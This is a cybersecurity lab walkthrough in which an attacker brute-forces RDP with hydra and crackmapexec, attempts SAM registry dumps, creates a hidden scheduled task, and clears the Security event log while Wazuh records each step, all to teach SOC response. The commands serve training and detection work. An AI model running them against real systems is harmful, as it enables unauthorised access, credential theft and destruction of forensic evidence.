# 🟧 Scenario 2 — Good SIEM, Weak SOC Response  
### *Attacker succeeds again — logs improve, but no one reacts*

This scenario demonstrates a realistic situation where:  
- Logging quality has increased after Scenario 1  
- Sysmon is now installed  
- Wazuh SIEM receives rich telemetry  
- Passwords are stronger (user changed to a personal OSINT-based password)  
- BUT the SOC still does **not respond** to alerts  

The attacker performs an OSINT-based password attack, gains access, runs more advanced post-exploitation steps, attempts persistence, performs partial cleanup, and leaves — while the SIEM logs everything, but the SOC ignores it.

---

# 🟦 1. Environment Overview (After Scenario 1 Improvements)

The company made corrections after Scenario 1, but not enough.

## 🔐 Password & Account Security
- Password complexity: **Enabled**
- Minimum password length: **8**
- Lockout threshold: **Still disabled**
- User changed password to a **personal, OSINT-derived password**  
  → You will use: **\<OSINT_PASSWORD\>**

**Screenshot:**  
➡️ secpol.msc → Password Policy  
➡️ secpol.msc → Account Lockout Policy

---

## 📊 Logging & Visibility (Improved)

### ✔ Audit Policy Updated
- 4624/4625 Logon events → enabled  
- 4688 New Process → enabled  
- 4663 Object access → partially enabled  
- 4697 Service installation → enabled  
- PowerShell logging → enabled (`ScriptBlockLogging`, `ModuleLogging`)

**Screenshot:**  
➡️ Local Security Policy → Advanced Audit Policy Configuration

---

## 👁️ Sysmon Visibility (Installed)

Sysmon now active:

- Event ID 1 → Process creation  
- Event ID 3 → Network connections  
- Event ID 11 → File creation  
- Event ID 12/13 → Registry changes  

**Screenshot:**  
➡️ `Get-Service sysmon*`  
➡️ Sysmon Event Log

---

## 📡 Wazuh Agent State (Fixed)

Wazuh agent now properly forwards:

- Windows Security logs  
- Sysmon logs  
- PowerShell Operational logs  
- Event Channel data  

**Screenshot:**  
➡️ Wazuh dashboard → Incoming Windows logs  
➡️ Sysmon event entries visible

---

## 🧱 Network Exposure (Unchanged)

- RDP (3389) still exposed  
- No MFA  
- No geoblocking  
- No rate limiting  
- No detection rules built for password attacks  

---

# 📌 Summary

The SIEM is now strong.  
The SOC team is still weak.  
This scenario illustrates that **visibility ≠ security**.

---

# 🟠 2. Before Starting Scenario 2

### ✔ Snapshot Windows Server  
Name: `scenario2_start_windows`

### ✔ Snapshot Kali Linux  
Name: `scenario2_start_kali`

### ✔ Confirm OSINT files exist  
- `usernames.txt`  
- `osint_passwords.txt`

---

# 🟧 3. Initial Access — OSINT-Based Login Attack

## 3.1 Username Enumeration (From Kali)

Test which username is valid via RDP protocol handshake:

\`\`\`bash
for user in $(cat usernames.txt); do
    xfreerdp /v:<WINDOWS_IP> /u:$user /p:RandomPassword123 /cert:ignore
done
\`\`\`

Expected:
- Incorrect username → immediate failure  
- Correct username → different failure timing  

**Screenshot:**  
➡️ Terminal showing at least one username behaving differently  
(e.g., valid username: `akovacs`)

---

## 3.2 OSINT-Based Password Brute Force

\`\`\`bash
hydra -L usernames.txt -P osint_passwords.txt rdp://<WINDOWS_IP>
\`\`\`

OR CME:

\`\`\`bash
crackmapexec rdp <WINDOWS_IP> -u usernames.txt -p osint_passwords.txt
\`\`\`

Expected:
- SIEM logs many 4625 failed attempts  
- Eventually → successful login for one user  

**Screenshot:**  
➡️ Hydra or CME success message  
➡️ Wazuh alert list showing multiple failed logon attempts

---

# 🟧 4. RDP Login — Attack Execution

\`\`\`bash
xfreerdp /v:<WINDOWS_IP> /u:<VALID_USERNAME> /p:<OSINT_PASSWORD> /cert:ignore
\`\`\`

**Screenshot:**  
➡️ Windows desktop after login

---

# 🟦 5. On-System Actions (Advanced Attacker Activity)

Run everything inside RDP.

---

## 5.1 Basic Recon

\`\`\`powershell
whoami
hostname
systeminfo
\`\`\`

**Screenshot:**  
➡️ Combined output

SIEM visibility:
- 4688 process creation  
- Sysmon ID 1 events  

---

## 5.2 Local User Enumeration

\`\`\`powershell
net user
Get-LocalUser
\`\`\`

---

## 5.3 PowerShell Recon

\`\`\`powershell
Get-ChildItem C:\Users
Get-Process
Get-Service
\`\`\`

PowerShell scriptblock logging will create Event ID 4104.

---

# 🟥 6. Credential Exploration Attempts

## 6.1 Registry Dump Attempt (SAM / SYSTEM)

\`\`\`powershell
reg save HKLM\\SAM C:\\temp\\sam.save
reg save HKLM\\SYSTEM C:\\temp\\system.save
\`\`\`

Expected:
- Operation **fails** due to access restrictions  
- Sysmon logs Event ID 11 (file create attempt)

**Screenshot:**  
➡️ PowerShell error + Sysmon event

---

# 🟦 7. Persistence Attempt — Scheduled Task

Create a simple persistence backdoor simulation:

\`\`\`powershell
schtasks /create /tn "Updater" /sc onlogon /tr "powershell.exe -nop -w hidden -c whoami"
\`\`\`

Wazuh / Sysmon visibility:
- 4698: Scheduled task created  
- Sysmon ID 1: powershell.exe invocation  
- PowerShell 4104 logs creation command

**Screenshot:**  
➡️ Task Scheduler → shows "Updater"  
➡️ Wazuh → new task creation event

---

# 🟧 8. Network Discovery

\`\`\`powershell
test-connection <KALI_IP>
net view
ipconfig /all
\`\`\`

SIEM sees:
- Sysmon ID 3 events  
- Network scans appear in logs  

---

# 🟪 9. Cleanup Attempts

## 9.1 PowerShell History Removal

\`\`\`powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
\`\`\`

## 9.2 Scheduled Task Deletion

\`\`\`powershell
schtasks /delete /tn "Updater" /f
\`\`\`

## 9.3 Event Log Clear Attempt

\`\`\`powershell
wevtutil cl Security
\`\`\`

Expected:
- SIEM HIGH alert: Security log was cleared  
- SOC analyst → **still does nothing**

**Screenshot:**  
➡️ Wazuh alert “Log cleared”  
➡️ PowerShell output

---

# 🚪 10. Attacker Exit

\`\`\`powershell
logoff
\`\`\`

---

# 🟦 11. What the SIEM Saw

### ✔ Correct username attempts  
### ✔ Many failed logons (4625)  
### ✔ Successful logon (4624)  
### ✔ Process creation (4688)  
### ✔ ScriptBlock logging (4104)  
### ✔ Scheduled Task creation (4698)  
### ✔ Registry access attempts  
### ✔ Log clearing attempt alert  

### ❌ What the SOC Did  
**Nothing.**  
No escalation, no ticket, no reaction.

**Screenshot:**  
➡️ Wazuh dashboard showing alerts  
➡️ Alert levels  
➡️ MITRE mapping

---

# 🟦 12. Lessons Learned (Narrative)

The company realizes:

- Good logs do not equal good security  
- SOC analysts need training  
- They need detection engineering playbooks  
- Password spraying / RDP attack detection rules must be created  
- Behavioral detection tuning is required  
- Scheduled task creation must generate alerts  
- Log clearing → immediate SOC escalation  

This sets the stage for **Scenario 3**,  
where the attacker escalates to phishing and credential theft.

---

# ✔ End of Scenario 2  
**Take snapshots:**

- Windows → `scenario2_end_windows`  
- Kali → `scenario2_end_kali`

